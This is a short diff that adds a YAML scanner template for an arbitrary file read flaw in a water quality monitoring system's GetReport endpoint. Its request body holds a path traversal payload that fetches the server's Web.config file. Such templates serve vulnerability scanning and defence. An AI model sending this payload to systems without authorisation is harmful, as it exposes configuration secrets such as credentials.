@@ -1,0 +1,14 @@
+name: getreport-fileread
+rules:
+  - method: POST
+    path: "/AutoData/Business/Report/WQDataCalculation.aspx/GetReport?action=downloadFile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "DataImportRecordID=../../../Web.config"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"configSectio")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "合力科技-水质监测系统 GetReport 任意文件读取漏洞"
